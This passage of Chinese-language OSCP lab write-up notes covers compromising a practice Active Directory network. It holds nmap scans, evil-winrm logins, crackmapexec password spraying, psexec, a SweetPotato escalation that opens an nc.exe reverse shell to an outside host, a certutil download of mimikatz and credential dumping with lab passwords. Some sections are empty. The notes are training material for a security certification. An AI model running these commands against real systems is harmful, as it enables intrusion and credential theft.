49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
===============================================192.168.102.160======================================
Nmap scan report for 192.168.102.160
Host is up (0.0026s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  unknown
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
```

### 192.168.102.159

winrm连接

```
evil-winrm -i 192.168.102.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

![image-20250406210128029](./oscp_pwk.assets/image-20250406210128029.png)

有所有权限，那可以直接拿到proof

![image-20250406210323431](./oscp_pwk.assets/image-20250406210323431.png)

修改administrator密码连接

![image-20250406210429806](./oscp_pwk.assets/image-20250406210429806.png)

通过DNS判断192.168.102.158为DC，最后上传mimikatz转存一手hash

发现了`o.foller`用户的明文密码：EarlyMorningFootball777

![image-20250406210933918](./oscp_pwk.assets/image-20250406210933918.png)

### 192.168.102.160

使用crackmapexec对域内一直凭证进行喷洒

```
crackmapexec smb 192.168.102.158-160 -u 'o.foller' -p 'EarlyMorningFootball777'
```

该凭证可以利用psexec登录160

![image-20250406211113700](./oscp_pwk.assets/image-20250406211113700.png)

成功登录，system权限

```
impacket-psexec 'o.foller:EarlyMorningFootball777'@192.168.102.160
```

![image-20250406211302789](./oscp_pwk.assets/image-20250406211302789.png)

拿到proof

![image-20250406211437274](./oscp_pwk.assets/image-20250406211437274.png)

收集一下用户信息

![image-20250406212301180](./oscp_pwk.assets/image-20250406212301180.png)

最后上传mimikatz转存hash

### 192.168.102.158













## Challenge 7 - Poseidon

> 我们接到任务，对以下网络进行渗透测试： *poseidon.xyz*。Active Directory 环境中存在多个漏洞和错误配置，攻击者可以利用这些漏洞和错误配置访问所有工作站。主要目标是获取域控制器的访问权限。
>
> 网络的公有子网位于 `192.168.xx.0/24` 范围内，其中第三个八位字节的 `xx` 可以从控制面板中的 *IP ADDRESS* 字段找到。
>
> 虽然这个挑战实验室并非模拟考试，但它已设置为使用 OSCP+ 考试中的“假设入侵”场景。可以使用以下凭据开始您的攻击：
>
> 用户名：Eric.Wallows 密码：EricLikesRunning800

> **192.168.102.163**
> 挑战8 - 虚拟机3操作系统凭据：
>
> ```
> Eric.Wallows/EricLikesRunning800
> ```

端口扫描：

```
┌──(root㉿cyborg)-[/home/cyborg/oscp/pwk/Poseidon]
└─# nmap -p- -Pn -A -sS -T4 192.168.102.161-163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 14:26 CST
=====================================================192.168.102.161=================================================
Nmap scan report for 192.168.102.161
Host is up (0.077s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-08 06:59:15Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: POSEIDON)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf       .NET Message Framing
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc        Microsoft Windows RPC
49707/tcp open  msrpc        Microsoft Windows RPC
64762/tcp open  msrpc        Microsoft Windows RPC
=====================================================192.168.102.162=================================================
Nmap scan report for 192.168.102.162
Host is up (0.076s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-08 06:59:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: sub)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc02.sub.poseidon.yzx
| Not valid before: 2025-02-19T22:23:48
|_Not valid after:  2025-08-21T22:23:48
|_ssl-date: 2025-04-08T07:02:51+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: sub
|   NetBIOS_Domain_Name: sub
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: sub.poseidon.yzx
|   DNS_Computer_Name: dc02.sub.poseidon.yzx
|   DNS_Tree_Name: poseidon.yzx
|   Product_Version: 10.0.14393
|_  System_Time: 2025-04-08T07:02:11+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
51233/tcp open  msrpc         Microsoft Windows RPC
=====================================================192.168.102.163=================================================
Nmap scan report for 192.168.102.163
Host is up (0.079s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Nmap done: 3 IP addresses (3 hosts up) scanned in 2171.24 seconds
```



### 192.168.102.163

使用题目给出凭证连接

```
evil-winrm -i 192.168.102.163 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

winrm成功连接，发现有模拟权限

![image-20250408153751369](./oscp_pwk.assets/image-20250408153751369.png)

上传提权即可

```
.\SweetPotato.exe -t * -p ".\nc.exe" -a "192.168.45.175 80 -e cmd.exe"
```

![image-20250408155824207](./oscp_pwk.assets/image-20250408155824207.png)

拿到proof

![image-20250408155859649](./oscp_pwk.assets/image-20250408155859649.png)

最后上传mimikatz抓取hash

抓取到了两个用户的明文密码(GYOZA的密码确实很奇怪)：

```
lisa/LisaWayToGo456
GYOZA/?+[`L=dw'Xv[q_>nw`!PVaMD#US[M9QQSXXRQZi#/;kWab7_4.Qzj=W&VY&so`.R^x!X[\6)1=O[4^y"!*X2>?E8e9)%(4`_6#cB(FT$..rmY3J)ebA(X1R#
```

DNS判断192.168.102.162为DC，先用已知凭证进行喷洒

```
crackmapexec smb 192.168.102.161,192.168.102.163 -u 'lisa' -p 'LisaWayToGo456'
```







### 192.168.102.161











```
certutil -split -urlcache -f http://192.168.45.175/mimikatz/x64/mimikatz.exe mimikatz.exe
```









